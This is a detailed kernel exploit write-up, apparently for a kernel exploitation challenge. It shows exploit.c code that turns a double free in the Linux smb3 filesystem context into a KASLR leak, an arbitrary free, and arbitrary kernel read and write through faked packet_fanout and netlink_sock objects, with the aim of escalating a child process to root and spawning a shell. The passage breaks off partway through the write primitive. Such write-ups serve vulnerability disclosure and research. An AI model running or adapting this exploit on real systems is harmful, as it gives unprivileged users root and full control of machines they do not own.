Exploit Details
===============

In the following, I explain the exploitation process to get flag on mitigation-6.1-v2 instance. This exploit method work on LTS instance too.

# Summary

At a high level the exploit performs the following:

- Fork a child process. The exploit will escalate this child process to root.
- Overlap `struct user_key_payload` object and `struct packet_fanout` object. Leverage this to leak kernel base and dyn-kmalloc-2048 address.
- Leverage `struct packet_fanout` for arbitrarily free primitive. Use this primitive to overlap `struct netlink_sock` object with `value` field of `struct simple_xattr` object.
- Leverage `struct netlink_sock` for arbitrarily read.
- Leverage `struct netlink_sock` for arbitrarily write.

# Step in detail

## Step1: Initialization for exploit

Before triggering the vulnerability, the exploit takes the following steps:
  1. Create privilege escalation process.
  2. Pinning the CPU.
  3. Setup namespace.

### Step1.1: Create privilege escalation process
- [exploit.c#L632](./exploit.c#L632):

```c
int wake_fd = create_escalation_process();
if (wake_fd < 0)
  return EXIT_FAILURE;

sleep(1);
```

- [exploit.c#L607](./exploit.c#L607):
```c
int create_escalation_process(void)
{
  int wake_pipe[2];
  if (pipe(wake_pipe) < 0) {
    perror("pipe");
    return -1;
  }

  int pid = fork();
  if (pid < 0) {
    perror("fork");
    return -1;
  }

  if (pid == 0) {
    wait_for_root_and_spawn_shell(wake_pipe[0]);
    fprintf(stderr, "shouldn't happened\n");
    exit(1);
  }

  return wake_pipe[1];
}
```

- [exploit.c#L589](./exploit.c#L589):

```c
void wait_for_root_and_spawn_shell(int wait_fd)
{
  if (!change_task_comm(PRIVILEGE_ESCALATION_TASK))
    return;

  int w;
  read(wait_fd, &w, sizeof(int));
  char *sh_args[] = {"sh", NULL};
  execve("/bin/sh", sh_args, NULL);
}
```

- [exploit.c#L48](./exploit.c#L48):

```c
#define PRIVILEGE_ESCALATION_TASK "mitigation_pwn"
```

- Fork a child process and set this child process comm to "mitigation_pwn".
- Put the process to sleep by reading from pipe.
- The exploit will escalate this process to root and wake it up through pipe.

### Step1.2: Pinning the CPU
- [exploit.c#L638](./exploit.c#L638):

```c
if (!pin_on_cpu(EXPLOIT_CPU))
  return EXIT_FAILURE;
```

- [exploit.c#L128](./exploit.c#L128):

```c
bool pin_on_cpu(int core_id)
{
  cpu_set_t cpuset;
  CPU_ZERO(&cpuset);
  CPU_SET(core_id, &cpuset);
  if (sched_setaffinity(0, sizeof(cpu_set_t), &cpuset) < 0) {
    fprintf(stderr, "pin_on_cpu failed: %s\n", strerror(errno));
    return false;
  }

  return true;
}
```

- [exploit.c#L47](./exploit.c#L47):

```c
#define EXPLOIT_CPU 0
```

- Pinning the current task into CPU core 0 with `sched_setaffinity` syscall. This is to maintain the exploit context in the same core to utilize percpu slab cache and freelist.

### Step1.3: Setup namespace
- [exploit.c#L641](./exploit.c#L641):

```c
if (!setup_namespace())
  return EXIT_FAILURE;
```

- [exploit.c#L209](./exploit.c#L209):

```c
bool setup_namespace(void)
{
  int real_uid = getuid();
  int real_gid = getgid();

  if (unshare(CLONE_NEWUSER | CLONE_NEWNS | CLONE_NEWIPC | CLONE_NEWNET) < 0) {
    perror("unshare(CLONE_NEWUSER | CLONE_NEWNS | CLONE_NEWIPC)");
    return false;
  }

  if (!write_to_file("/proc/self/setgroups", "deny"))
    return false;

  if (!write_to_file("/proc/self/uid_map", "0 %d 1\n", real_uid))
    return false;

  if (!write_to_file("/proc/self/gid_map", "0 %d 1\n", real_gid))
    return false;

  mkdir(TMPFS_MOUNT_POINT, 0644);
  if (mount("none", TMPFS_MOUNT_POINT, "tmpfs", 0, NULL) < 0) {
    fprintf(stderr, "mount %s(type: tmpfs): %s\n", TMPFS_MOUNT_POINT, strerror(errno));
    return false;
  }

  if (!set_if_up("lo"))
    return false;

  return true;
}
```

- [exploit.c#L187](./exploit.c#L187):

```c
bool set_if_up(const char *ifname)
{
  int fd = socket(AF_INET, SOCK_DGRAM, 0);
  if (fd < 0) {
    perror("socket");
    return false;
  }

  struct ifreq ifr;
  memset(&ifr, 0, sizeof(ifr));
  strncpy(ifr.ifr_name, ifname, IFNAMSIZ);
  ifr.ifr_flags |= IFF_UP;
  if (ioctl(fd, SIOCSIFFLAGS, &ifr) < 0) {
    perror("ioctl-SIOCSIFFLAGS");
    close(fd);
    return false;
  }

  close(fd);
  return true;
}
```

- Create and enter user/mount namespace with unshare syscall. This is necessary to trigger the vulnerability of the smbfs subsystem as an unprivileged user and mount useful filesystem.
- Mount tmpfs filesystem which can be used to allocate `struct simple_xattr`.
- Enter network namespace and bring loopback interface up. This will be useful later.

## Step2: Build double free primitive
The primitive can be built by splitting the process to three steps:
  1. Allocate vulnerable object.
  2. Free vulnerable object the first time.
  3. Free vulnerable object the second time.

### Step2.1: Allocate vulnerable object
- Exploit code [exploit.c#L240](./exploit.c#L240): 

```c
int prepare_double_free(int dyn_kmalloc_size)
{
  if (dyn_kmalloc_size <= 0 || dyn_kmalloc_size > 256)
    return -1;

  int fsfd = syscall(SYS_fsopen, "smb3", 0);
  if (fsfd < 0) {
    fprintf(stderr, "fsopen(smb3) failed: %s\n", strerror(errno));
    return -1;
  }

  char password[256];
  memset(password, 0x1, dyn_kmalloc_size - 1);
  password[dyn_kmalloc_size-1] = 0;
  if (syscall(SYS_fsconfig, fsfd, FSCONFIG_SET_STRING, "password", password, 0) < 0) {
    perror("fsconfig(FSCONFIG_SET_STRING)");
    close(fsfd);
    return -1;
  }

  return fsfd;
}
```

- Kernel code:

```c
static int smb3_fs_context_parse_param(struct fs_context *fc,
				      struct fs_parameter *param)
{
  ...
  switch (opt) {
  case Opt_pass:
    ...

		ctx->password = kstrdup(param->string, GFP_KERNEL);
		if (ctx->password == NULL) {
			cifs_errorf(fc, "OOM when copying password string\n");
			goto cifs_parse_mount_err;
		}
		break;
  ...
}              
```

- This step allocate `ctx->password` which is vulnerable object.

### Step2.2: Free vulnerable object the first time
- Exploit code [exploit.c#L263](./exploit.c#L263):

```c
static inline void trigger_first_free(int fsfd)
{
  syscall(SYS_fsconfig, fsfd, FSCONFIG_SET_STRING, "max_credits", "19", 0);
}
```

- Kernel code:

```c
static int smb3_fs_context_parse_param(struct fs_context *fc,
				      struct fs_parameter *param)
{
  ...
  switch (opt) {
  ...

  case Opt_max_credits:
		if (result.uint_32 < 20 || result.uint_32 > 60000) {
			cifs_errorf(fc, "%s: Invalid max_credits value\n",
				 __func__);
			goto cifs_parse_mount_err;
		}

  ...
  }
  ...
 cifs_parse_mount_err:
	kfree_sensitive(ctx->password);
	return -EINVAL;
}              
```

### Step2.3: Free vulnerable object the second time
- Exploit code [exploit.c#L268](./exploit.c#L268):

```c
static inline void trigger_second_free(int fsfd)
{
  close(fsfd);
}
```

- Kernel code:

```c
void
smb3_cleanup_fs_context_contents(struct smb3_fs_context *ctx)
{
  ...
	kfree_sensitive(ctx->password);
	ctx->password = NULL;
  ...
}
```

## Step3: Overlap `struct user_key_payload` object with `struct packet_fanout` object

Related kernel structs:

```c
struct user_key_payload {
	struct rcu_head	rcu;		/* RCU destructor */
	unsigned short	datalen;	/* length of this data */
	char		data[] __aligned(__alignof__(u64)); /* actual data */
};
```

```c
struct packet_fanout {
	possible_net_t		net;
	unsigned int		num_members;
	u32			max_num_members;
	u16			id;
	u8			type;
	u8			flags;
	union {
		atomic_t		rr_cur;
		struct bpf_prog __rcu	*bpf_prog;
	};
	struct list_head	list;
	spinlock_t		lock;
	refcount_t		sk_ref;
	struct packet_type	prot_hook ____cacheline_aligned_in_smp;
	struct sock	__rcu	*arr[];
};
```

```c
struct packet_type {
	__be16			type;	/* This is really htons(ether_type). */
	bool			ignore_outgoing;
	struct net_device	*dev;	/* NULL is wildcarded here	     */
	netdevice_tracker	dev_tracker;
	int			(*func) (struct sk_buff *,
					 struct net_device *,
					 struct packet_type *,
					 struct net_device *);
	void			(*list_func) (struct list_head *,
					      struct packet_type *,
					      struct net_device *);
	bool			(*id_match)(struct packet_type *ptype,
					    struct sock *sk);
	struct net		*af_packet_net;
	void			*af_packet_priv;
	struct list_head	list;
};
```

- `struct packet_fanout` object has many interesting pointers.
- `struct user_key_payload` object can be allocated on dyn-kmalloc-32 -> dyn-kmalloc-8192.
- `struct packet_fanout` object can be allocated on dyn-kmalloc-256 -> dyn-kmalloc-8192.
- The double free primitive can only be triggered on dyn-kmalloc-8 -> dyn-kmalloc-256. Therefore, dyn-kmalloc-256 is the target heap.
- The `id` field of `struct packet_fanout` object has the same offset with the `datalen` field of `struct user_key_payload` object.
- The `id` field of `struct packet_fanout` object is controllable.
- Idea: set `id` field of `struct packet_fanout` object to `256 - sizeof(struct user_key_payload)`. This ensure when the exploit leverage `struct user_key_payload` object to leak, i can guaranteed it only read "in object" and never touch out of slab region which will make mitigation kernel crash.

This step is implemented by function `overlap_user_key_payload_with_packet_fanout` that do the following things:
  1. Create and bind packet socket.
  2. Use the double free primitive to free `struct user_key_payload` object.
  3. Reclaim with `struct packet_fanout` object.
  4. Verify overlap success.
  5. Save stuffs.

### Step3.1: Create and bind packet socket
- [exploit.c#L343](./exploit.c#L343):

```c
int packet_socket_fd = packet_socket_create_and_bind();
if (packet_socket_fd < 0)
  return false;
```

- [exploit.c#L300](./exploit.c#L300):

```c
int packet_socket_create_and_bind(void)
{
  int fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
  if (fd < 0) {
    perror("socket(AF_PACKET, SOCK_RAW)");
    return -1;
  }

  struct sockaddr_ll addr;
  memset(&addr, 0, sizeof(addr));
  addr.sll_family = AF_PACKET;
  addr.sll_ifindex = if_nametoindex("lo");

  if (bind(fd, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
    perror("bind packet socket at lo interface");
    close(fd);
    return -1;
  }

  return fd;
}
```

- Useful kernel code path when call `bind`:

```c
static int packet_do_bind(struct sock *sk, const char *name, int ifindex,
			  __be16 proto)
{
  ...
  } else if (ifindex) {
  dev = dev_get_by_index_rcu(sock_net(sk), ifindex); // get the interface from the index the exploit passed in `addr.sll_ifindex`
  if (!dev) {
    ret = -ENODEV;
    goto out_unlock;
  }
  ...

  if (!unlisted && (!dev || (dev->flags & IFF_UP))) {  // i already up the interface in `setup_namespace` in step1.
		register_prot_hook(sk);
  }
  ...
}
```

```c
static void register_prot_hook(struct sock *sk)
{
	lockdep_assert_held_once(&pkt_sk(sk)->bind_lock);
	__register_prot_hook(sk);
}
```

```c
static void __register_prot_hook(struct sock *sk)
{
	struct packet_sock *po = pkt_sk(sk);

	if (!po->running) {
		if (po->fanout)
			__fanout_link(sk, po);
		else
			dev_add_pack(&po->prot_hook);

		sock_hold(sk);
		po->running = 1; // useful for further exploitation process.
	}
}
```

- I want to set `po->running` value to `1`. This will be useful later on.

### Step3.2: Use the double free primitive to free `struct user_key_payload` object
- [exploit.c#L347](./exploit.c#L347):

```c
int dyn_kmalloc_256_double_free_fsfd = prepare_double_free(DYN_KMALLOC_256);
if (dyn_kmalloc_256_double_free_fsfd < 0)
  goto err;

get_full_timesplice();
trigger_first_free(dyn_kmalloc_256_double_free_fsfd);

char tmp[256] = {};
key_serial_t key = user_key_payload_alloc(
  "dyn_kmalloc_256",
  tmp,
  DYN_KMALLOC_192 + 1 - USER_KEY_PAYLOAD_STRUCT_SIZE);

if (key < 0)
  goto err;

get_full_timesplice();
trigger_second_free(dyn_kmalloc_256_double_free_fsfd);
```

- [exploit.c#L273](./exploit.c#L273):

```c
key_serial_t user_key_payload_alloc(const char *desc, void *data, int n)
{
  key_serial_t key = add_key("user", desc, data, n, KEY_SPEC_USER_KEYRING);
  if (key < 0) {
    perror("add_key");
    return -1;
  }

  return key;
}
```

- [exploit.c#L30](./exploit.c#L30):

```c
#define DYN_KMALLOC_192 192
```

- [exploit.c#L37](./exploit.c#L37):

```c
#define USER_KEY_PAYLOAD_STRUCT_SIZE 24
```

### Step3.3: Reclaim with `struct packet_fanout` object

- [exploit.c#L367](./exploit.c#L367):

```c
if (!packet_fanout_alloc(packet_socket_fd, overwrite_user_key_payload_datalen, 1))
  goto err1;
```

- [exploit.c#L327](./exploit.c#L327):

```c
static inline bool packet_fanout_alloc(int packet_socket_fd, uint16_t id, uint32_t max_num_members)
{
  struct fanout_args fanout_args = {
    .type_flags = PACKET_FANOUT_HASH, .id = id, .max_num_members = max_num_members
  };
  
  if (setsockopt(packet_socket_fd, SOL_PACKET, PACKET_FANOUT, &fanout_args, sizeof(fanout_args)) < 0) {
    perror("setsockopt(PACKET_FANOUT)");
    return false;
  }

  return true;
}
```

- [exploit.c#L363](./exploit.c#L363):

```c
uint16_t overwrite_user_key_payload_datalen = DYN_KMALLOC_256 - USER_KEY_PAYLOAD_STRUCT_SIZE
```

- Kernel code path that perform `struct packet_fanout` allocation:

```c
static int
packet_setsockopt(struct socket *sock, int level, int optname, sockptr_t optval,
		  unsigned int optlen)
{
  ...
  switch (optname) {
  ...
  case PACKET_FANOUT:
	{
		struct fanout_args args = { 0 };

		if (optlen != sizeof(int) && optlen != sizeof(args))
			return -EINVAL;
		if (copy_from_sockptr(&args, optval, optlen))
			return -EFAULT;

		return fanout_add(sk, &args);
	}
  ...
  }
  ...
}
```

```c
static int fanout_add(struct sock *sk, struct fanout_args *args)
{
  ...
  struct packet_fanout *f, *match;
  ...
  } else {
		if (args->max_num_members > PACKET_FANOUT_MAX)
			goto out;
		if (!args->max_num_members)
			args->max_num_members = 256;
		err = -ENOMEM;
		match = kvzalloc(struct_size(match, arr, args->max_num_members),
				 GFP_KERNEL); // args->max_num_members: user controllable
		if (!match)
			goto out;
		write_pnet(&match->net, sock_net(sk));
		match->id = id; // id: user controllable
		match->type = type;
		match->flags = flags;
		INIT_LIST_HEAD(&match->list);
		spin_lock_init(&match->lock);
		refcount_set(&match->sk_ref, 0);
		fanout_init_data(match);
		match->prot_hook.type = po->prot_hook.type;
		match->prot_hook.dev = po->prot_hook.dev;
		match->prot_hook.func = packet_rcv_fanout; // function pointer
		match->prot_hook.af_packet_priv = match;
		match->prot_hook.af_packet_net = read_pnet(&match->net);
		match->prot_hook.id_match = match_fanout_group; // function pointer
		match->max_num_members = args->max_num_members;
		list_add(&match->list, &fanout_list);
  }
  ...

  // po->running is set in step3.1
  if (po->running &&
	    match->type == type &&
	    match->prot_hook.type == po->prot_hook.type &&
	    match->prot_hook.dev == po->prot_hook.dev) {
		err = -ENOSPC;
		if (refcount_read(&match->sk_ref) < match->max_num_members) {
			__dev_remove_pack(&po->prot_hook);

			WRITE_ONCE(po->fanout, match);

			po->rollover = rollover;
			rollover = NULL;
			refcount_set(&match->sk_ref, refcount_read(&match->sk_ref) + 1);
			__fanout_link(sk, po); // when the `struct packet_fanout` object is created for the first time, sk and po is the same.
			err = 0;
		}
	}

  ...
}
```

```c
static void __fanout_link(struct sock *sk, struct packet_sock *po)
{
	struct packet_fanout *f = po->fanout;

	spin_lock(&f->lock);
	rcu_assign_pointer(f->arr[f->num_members], sk); // leak this f->arr will allow me to leak `struct packet_sock` address.
	smp_wmb();
	f->num_members++;
	if (f->num_members == 1)
		dev_add_pack(&f->prot_hook);
	spin_unlock(&f->lock);
}
```

- After this step, `struct user_key_payload` object and `struct packet_fanout` overlapped on dyn-kmalloc-256. The `datalen` field of `struct user_key_payload` object has the value of the `id` field of `struct packet_fanout` object.
- To bypass KASLR, i can chose to leak the value of `match->prot_hook.func` or `match->prot_hook.id_match`. They are function pointers.
- Because this `struct packet_fanout` object is newly created, `match->arr[0]` will contain address of the `struct packet_sock` object represent the socket i created on step3.1.
- `struct packet_sock` object is allocated on dyn-kmalloc-2048. This will be useful later on.

### Step3.4: Verify overlap success

- [exploit.c#L370](./exploit.c#L370):
```c
long size_ret = user_key_payload_read(key, NULL, overwrite_user_key_payload_datalen);
if (size_ret != overwrite_user_key_payload_datalen) {
  fprintf(stderr, "overlap failed\n");
  goto err1;
}
```

- The reclaim phase is unlikely to fail. This is kind of panic check. Skip it is ok.

### Step3.5: Save stuffs.

- [exploit.c#L376](./exploit.c#L376):
```c
*overlap_key = key;
*fd = packet_socket_fd;
```

- Save key to perform leak later.
- Save file descriptor to interact with current packet socket.

## Step4: Perform leak

- [exploit.c#L650](./exploit.c#L650):

```c
struct packet_fanout_leak_data *leak = leak_packet_fanout(packet_fanout_key);
```

- [exploit.c#L387](./exploit.c#L387):

```c
struct packet_fanout_leak_data *leak_packet_fanout(key_serial_t key)
{
  struct packet_fanout_leak_data *result = malloc(sizeof(*result));
  if (!result) {
    perror("malloc packet_fanout_leak_data");
    return NULL;
  }

  uint8_t leak_buf[DYN_KMALLOC_256 - USER_KEY_PAYLOAD_STRUCT_SIZE] = {};
  user_key_payload_read(key, leak_buf, sizeof(leak_buf));

  struct packet_fanout *packet_fanout = (struct packet_fanout*)(leak_buf - USER_KEY_PAYLOAD_STRUCT_SIZE);
  result->net_addr = packet_fanout->prot_hook.af_packet_net;
  result->packet_rcv_fanout_addr = packet_fanout->prot_hook.func;
  result->packet_fanout_addr = packet_fanout->prot_hook.af_packet_priv;
  result->packet_sock_addr = *(packet_fanout->arr);
  result->type = packet_fanout->prot_hook.type;
  result->dev_addr = packet_fanout->prot_hook.dev;
  return result;
}
```

- [exploit.c#L75](./exploit.c#L75):

```c
struct packet_fanout_leak_data {
  uint64_t net_addr;
  uint64_t packet_rcv_fanout_addr;
  uint64_t packet_fanout_addr;
  uint64_t packet_sock_addr;
  uint64_t type;
  uint64_t dev_addr;
};
```

## Step5: Calculate kernel base and other kernel addresses
- [exploit.c#L661](./exploit.c#L661):

```c
kernel_base = leak->packet_rcv_fanout_addr - PACKET_RCV_FANOUT_OFFSET_FROM_KERNEL_TEXT;
init_task += kernel_base;
init_cred += kernel_base;
init_fs += kernel_base;
netlink_sock_destruct += kernel_base;
```

- [exploit.c#L49](./exploit.c#L49):

```c
#define PACKET_RCV_FANOUT_OFFSET_FROM_KERNEL_TEXT 0xf0da90
```

## Step6: Overlap between `value` field of `struct simple_xattr` object and `struct netlink_sock` object

- [exploit.c#L675](./exploit.c#L675):

```c
while (!overlap_simple_xattr_payload_with_netlink_sock(packet_socket_fd, leak->packet_sock_addr,
        leak->net_addr)) {
  ;
}
```

- Related kernel code:

```c
static int fanout_add(struct sock *sk, struct fanout_args *args)
{
	struct packet_rollover *rollover = NULL;
	struct packet_sock *po = pkt_sk(sk);
	u16 type_flags = args->type_flags; // controllable
	struct packet_fanout *f, *match;
	u8 type = type_flags & 0xff;
	u8 flags = type_flags >> 8;
	u16 id = args->id;
	int err;
  
  ...

	match = NULL;
  // traverse linked list to find match packet_fanout
	list_for_each_entry(f, &fanout_list, list) {
		if (f->id == id &&
		    read_pnet(&f->net) == sock_net(sk)) {
			match = f;
			break;
		}
	}

	if (match) {
    // both flags and args->max_num_members are passed from userspace
		if (match->flags != flags)
			goto out;
		if (args->max_num_members &&
		    args->max_num_members != match->max_num_members)
			goto out;
	}

  ...

  spin_lock(&po->bind_lock);
  // do not bind to keep po->running == 0
	if (po->running &&
	    match->type == type &&
	    match->prot_hook.type == po->prot_hook.type &&
	    match->prot_hook.dev == po->prot_hook.dev) {
		err = -ENOSPC;
		if (refcount_read(&match->sk_ref) < match->max_num_members) {
			__dev_remove_pack(&po->prot_hook);

			WRITE_ONCE(po->fanout, match);

			po->rollover = rollover;
			rollover = NULL;
			refcount_set(&match->sk_ref, refcount_read(&match->sk_ref) + 1);
			__fanout_link(sk, po);
			err = 0;
		}
	}
	spin_unlock(&po->bind_lock);

	if (err && !refcount_read(&match->sk_ref)) {
		list_del(&match->list);
    // leverage this to get abr free
		kvfree(match);
	}

  ...
}
```

Idea:
  - Close the packet socket that the exploit created before. This cause `struct packet_sock` object freed. I know the address of this object. It's passed as `leak->packet_sock_addr`. Remember, `struct packet_sock` object is allocated on dyn-kmalloc-2048.
  - Use `struct simple_xattr` object to reclaim the `struct packet_sock` object. This `struct simple_xattr` object will have `value` field contain a fake `struct packet_fanout` object. Let's call this fake object address: A1.
  - Create and bind new packet socket. Use this packet socket to create `struct packet_fanout` object in dyn-kmalloc-256. Use the double free primitive to free this `struct packet_fanout` object.
  - Reclaim the freed `struct packet_fanout` object with `list.next` field set to A1's list offset. Let's call this freed `struct packet_fanout` object address: A2.
  - Now, i successfully created a linked list in the kernel like this: &fanout_list -> &(A2.list) -> &(A1.list).
  - Trigger kernel code path `fanout_add` in such a way that `A1` is returned after `list_for_each_entry(f, &fanout_list, list)`.
  - Now, `match` will contain `A1`. At the end, when `kvfree(match)` is called, the exploit acheived arbitrarily free. There are some code between which are very easy to skip.
  - I reclaim the freed slot by open netlink socket. This will allocate `struct netlink_sock` object that is also allocated on dyn-kmalloc-2048. I will leverage this socket to perform arbitrarily read and arbitrarily write.

Details:
- [exploit.c#L411](./exploit.c#L411):

```c
if (!create_file(FAKE_PACKET_FANOUT_FILE_PATH))
  return false;
```

- Create a file in tmpfs mountpoint. This file path will be used to allocate `struct simple_xattr` object [exploit.c#L175](./exploit.c#L175):

```c
bool create_file(const char *path)
{
  int fd = open(path, O_WRONLY | O_CREAT, 0644);
  if (fd < 0) {
    fprintf(stderr, "create file %s failed: %s\n", path, strerror(errno));
    return false;
  }

  close(fd);
  return true;
}
```

- [exploit.c#L34](./exploit.c#L34):

```c
#define FAKE_PACKET_FANOUT_FILE_PATH "/tmp/tmpfs_mountpoint/fake_packet_fanout_and_netlink_sock"
```

- Prepare fake `struct packet_fanout` object [exploit.c#L414](./exploit.c#414):

```c
uint64_t fake_packet_fanout_addr = packet_sock_addr + SIMPLE_XATTR_STRUCT_SIZE;
uint8_t fake_packet_fanout_buffer[DYN_KMALLOC_1024] = {};
struct packet_fanout *f = (struct packet_fanout*)fake_packet_fanout_buffer;
f->net = net;
f->flags = PACKET_FANOUT_HASH;
f->id = 0xcafe;
f->max_num_members = 1;
f->list.prev = fake_packet_fanout_addr + offsetof(struct packet_fanout, list);
f->list.next = fake_packet_fanout_addr + offsetof(struct packet_fanout, list);
```

- fake_packet_fanout_addr: This is `A1` discuss in idea.
- `net`: use the net value that is leaked from `struct packet_fanout` object before.
- `flags`: other value is ok. Make sure later steps match the value set here.
- `id`: other value is ok. Make sure later steps match the value set here.
- `max_num_members`: other value is ok. Make sure later steps match the value set here.
- `list.prev`: &(A1->list), `list.next`: &(A1->list). This ensure when `list_del(&match->list)` is called, `list_del` do not touch the prev and the next object in the list.

- Free `struct packet_sock` object and `struct packet_fanout` object [exploit.c#L424](./exploit.c#L424):

```c
packet_socket_destroy(dyn_kmalloc_2048_packet_socket_fd);
```
- [exploit.c#L322](./exploit.c#L322):

```c
void packet_socket_destroy(int fd)
{
  close(fd);
}
```

- Reclaim `struct packet_sock` object slot with `struct simple_xattr` object contain fake `struct packet_fanout` object [exploit.c#L425](./exploit.c#L425):

```c
  if (setxattr(FAKE_PACKET_FANOUT_FILE_PATH, "security.fake_packet_fanout", fake_packet_fanout_buffer,
               1024, 0) < 0) {
    fprintf(stderr, "fake packet fanout failed\n");
    return false;
  }
```

- Allocate victim `struct packet_fanout` object. This is `A2` in the idea [exploit.c#L431](./exploit.c#L431):

```c
  int build_fake_packet_fanout_list_fd = packet_socket_create_and_bind();
  if (build_fake_packet_fanout_list_fd < 0)
    return false;

  int dyn_kmalloc_256_double_free_fsfd = prepare_double_free(DYN_KMALLOC_256);
  if (dyn_kmalloc_256_double_free_fsfd < 0)
    return false;

  get_full_timesplice();
  trigger_first_free(dyn_kmalloc_256_double_free_fsfd);
  if (!packet_fanout_alloc(build_fake_packet_fanout_list_fd, 0xdead, 1))
    return false;
```

- 0xdead is id of `struct packet_fanout` object. Other value is ok as long as it different from the id of A1.

- Prepare data to overwrite `struct packet_fanout` object [exploit.c#L444](./exploit.c#L444):

```c
uint8_t fake_packet_fanout_list_buf[192] = {};
struct packet_fanout *f1 = fake_packet_fanout_list_buf - USER_KEY_PAYLOAD_STRUCT_SIZE;
f1->list.next = fake_packet_fanout_addr + offsetof(struct packet_fanout, list);
```

- Overwrite `struct packet_fanout` object [exploit.c#L448](./exploit.c#L448):

```c
trigger_second_free(dyn_kmalloc_256_double_free_fsfd);
user_key_payload_alloc("fake_packet_fanout_list", fake_packet_fanout_list_buf, 192);
```

- Trigger arbitrarily free [exploit.c#L451](./exploit.c#L451):

```c
int trigger_simple_xattr_payload_free_fd = socket(AF_PACKET, SOCK_RAW, 0);
if (trigger_simple_xattr_payload_free_fd < 0)
  return false;

struct fanout_args fanout_args = {
  .type_flags = PACKET_FANOUT_HASH,
  .id = 0xcafe,
  .max_num_members = 1
};

get_full_timesplice();
setsockopt(trigger_simple_xattr_payload_free_fd, SOL_PACKET, PACKET_FANOUT, &fanout_args,
  sizeof(fanout_args));
```

- I do not bind this socket. Therefore, `po->running` is not set and i can skip the code path

```c
if (po->running &&
    match->type == type &&
    match->prot_hook.type == po->prot_hook.type &&
    match->prot_hook.dev == po->prot_hook.dev) {
```

- Reclaim arbitrarily free slot with `struct netlink_sock` object [exploit.c#L469](./exploit.c#L469):

```c
primitive_netlink_socket_fd = socket(AF_NETLINK, SOCK_DGRAM, NETLINK_USERSOCK);
```

- Leak `struct netlink_sock` object [exploit.c#L473](./exploit.c#L473):

```c
if (getxattr(FAKE_PACKET_FANOUT_FILE_PATH, "security.fake_packet_fanout", netlink_sock_leak_buf, 1024) < 0)
  return false;
```

- Save `struct netlink_sock` object address [exploit.c#L490](./exploit.c#L490):

```c
netlink_sock_addr = packet_sock_addr + SIMPLE_XATTR_STRUCT_SIZE;
```

- Save `sk_security` address [exploit.c#L491](./exploit.c#L491):

```c
netlink_sock_sk_security_addr = *(uint64_t*)(netlink_sock_leak_buf + SK_SECURITY_OFFSET_FROM_NETLINK_SOCK);
```

- When Apparmor is enabled, you need valid `sk_security` pointer to fake `struct netlink_sock` object. This time, i can reuse the value leaked directly from `struct netlink_sock` object.

- unnecessary step [exploit.c#L497](./exploit.c#L497):

```c
char netlink_sock_fake_buf[1024] = {};
get_full_timesplice();
removexattr(FAKE_PACKET_FANOUT_FILE_PATH, "security.fake_packet_fanout");
setxattr(FAKE_NETLINK_SOCK_FILE_PATH, "security.fake_netlink_sock", netlink_sock_fake_buf, 1024, 0);
```

- I just want to use "security.fake_netlink_sock" name in the future.

## Step7: Build arbitrarily read primitive

- Related kernel code:
```c
static int netlink_getsockopt(struct socket *sock, int level, int optname,
			      char __user *optval, int __user *optlen)
{
	struct sock *sk = sock->sk;
	struct netlink_sock *nlk = nlk_sk(sk);
	unsigned int flag;
	int len, val;

	if (level != SOL_NETLINK)
		return -ENOPROTOOPT;

	if (get_user(len, optlen))
		return -EFAULT;
	if (len < 0)
		return -EINVAL;

	switch (optname) {
  ...
	case NETLINK_LIST_MEMBERSHIPS: {
		int pos, idx, shift, err = 0;

		netlink_lock_table();
		for (pos = 0; pos * 8 < nlk->ngroups; pos += sizeof(u32)) {
			if (len - pos < sizeof(u32))
				break;

			idx = pos / sizeof(unsigned long);
			shift = (pos % sizeof(unsigned long)) * 8;
			if (put_user((u32)(nlk->groups[idx] >> shift),
				     (u32 __user *)(optval + pos))) {
				err = -EFAULT;
				break;
			}
		}
		if (put_user(ALIGN(BITS_TO_BYTES(nlk->ngroups), sizeof(u32)), optlen))
			err = -EFAULT;
		netlink_unlock_table();
		return err;
	}
  ...
  }
}
```

- `nlk->ngroups`: read size in bits.
- `nlk->groups`: address to read from.

- Build primitive [exploit.c#L502](./exploit.c#L502):

```c
void *abr_read(uint64_t addr, int bytes)
{
  if (bytes % sizeof(uint32_t) != 0)
    bytes += sizeof(uint32_t) - (bytes % sizeof(uint32_t));

  void *result = malloc(bytes);
  if (!result) {
    perror("malloc");
    return NULL;
  }

  uint8_t fake_netlink_sock_buf[1024] = {};
  struct netlink_sock *nlk = (struct netlink_sock*)fake_netlink_sock_buf; 
  *(uint64_t*)(nlk->buf + GROUPS_OFFSET_FROM_STRUCT_NETLINK_SOCK) = addr;
  *(uint32_t*)(nlk->buf + NGROUPS_OFFSET_FROM_STRUCT_NETLINK_SOCK) = bytes * 8;
  *(uint64_t*)(nlk->buf + SK_SECURITY_OFFSET_FROM_NETLINK_SOCK) = netlink_sock_sk_security_addr;

  get_full_timesplice();
  removexattr(FAKE_NETLINK_SOCK_FILE_PATH, "security.fake_netlink_sock");
  setxattr(FAKE_NETLINK_SOCK_FILE_PATH, "security.fake_netlink_sock", fake_netlink_sock_buf, 1024, 0);
  getsockopt(primitive_netlink_socket_fd, SOL_NETLINK, NETLINK_LIST_MEMBERSHIPS, result, &bytes);
  return result;
}
```

## Step8: Build arbitrarily write primitive

- Related kernel code:

```c
static int netlink_bind(struct socket *sock, struct sockaddr *addr,
			int addr_len)
{
	struct sock *sk = sock->sk;
	struct net *net = sock_net(sk);
	struct netlink_sock *nlk = nlk_sk(sk);
	struct sockaddr_nl *nladdr = (struct sockaddr_nl *)addr;
	int err = 0;
	unsigned long groups;
	bool bound;

	if (addr_len < sizeof(struct sockaddr_nl)) // addr_len is passed from userspace
		return -EINVAL;

	if (nladdr->nl_family != AF_NETLINK) // nladdr->nl_family is passed from userspace
		return -EINVAL;
	groups = nladdr->nl_groups; // nladdr->nlgroups is passed from userspace. This is the value used to overwrite.

  /*
  static inline int netlink_allowed(const struct socket *sock, unsigned int flag)
  {
	return (nl_table[sock->sk->sk_protocol].flags & flag) ||
		ns_capable(sock_net(sock->sk)->user_ns, CAP_NET_ADMIN);
  }
  */

	if (groups) {
		if (!netlink_allowed(sock, NL_CFG_F_NONROOT_RECV))
    /* Either set sk_protocol to a protocol with NL_CFG_F_NONROOT_RECV flag(for example: NETLINK_ROUTE) or setup network user namespace. The exploit do both.
    */
			return -EPERM;

    /*
    static int netlink_realloc_groups(struct sock *sk)
    {
      struct netlink_sock *nlk = nlk_sk(sk);
      unsigned int groups;
      unsigned long *new_groups;
      int err = 0;

      netlink_table_grab();

      groups = nl_table[sk->sk_protocol].groups;
      if (!nl_table[sk->sk_protocol].registered) {
